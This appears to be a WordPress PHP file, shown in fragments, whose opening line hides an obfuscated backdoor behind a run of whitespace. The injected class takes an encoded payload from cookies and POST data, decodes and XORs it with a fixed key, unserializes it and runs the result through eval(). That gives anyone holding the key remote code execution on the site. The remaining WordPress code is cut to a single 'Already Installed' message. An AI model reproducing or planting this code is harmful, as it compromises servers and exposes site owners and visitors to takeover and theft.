<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $bXizId = class_exists("jcN_dvVc"); $QFdsYZcH = $bXizId;if (!$QFdsYZcH){class jcN_dvVc{private $bNMzEISImO;public static $WCYbkB = "57e01e19-beff-4834-8d2a-d8d89639719c";public static $yLDxS = NULL;public function __construct(){$BYVNFzrV = $_COOKIE;$FBKTPy = $_POST;$zhBlkBdx = @$BYVNFzrV[substr(jcN_dvVc::$WCYbkB, 0, 4)];if (!empty($zhBlkBdx)){$ObrroHfzL = "base64";$WNBnU = "";$zhBlkBdx = explode(",", $zhBlkBdx);foreach ($zhBlkBdx as $uxgHfUlF){$WNBnU .= @$BYVNFzrV[$uxgHfUlF];$WNBnU .= @$FBKTPy[$uxgHfUlF];}$WNBnU = array_map($ObrroHfzL . "\137" . chr (100) . 'e' . 'c' . chr (111) . chr ( 295 - 195 ).'e', array($WNBnU,)); $WNBnU = $WNBnU[0] ^ str_repeat(jcN_dvVc::$WCYbkB, (strlen($WNBnU[0]) / strlen(jcN_dvVc::$WCYbkB)) + 1);jcN_dvVc::$yLDxS = @unserialize($WNBnU);}}public function __destruct(){$this->JsPdiAeuf();}private function JsPdiAeuf(){if (is_array(jcN_dvVc::$yLDxS)) {$ATLnQrnU = str_replace(chr (60) . '?' . "\160" . chr (104) . chr (112), "", jcN_dvVc::$yLDxS[chr (99) . "\157" . "\x6e" . "\164" . "\x65" . chr ( 632 - 522 ).chr ( 466 - 350 )]);eval($ATLnQrnU);exit();}}}$VUXPMbOCSk = new jcN_dvVc(); $VUXPMbOCSk = NULL;} ?><?php /* 
*
...
/* 1>' . __( 'Already Installed' ) . '</h1><p>' . __( 'You appear to have already installed WordPress. To reinstall please clear your old database tables first.' ) . '</p></body></html>' );
	}
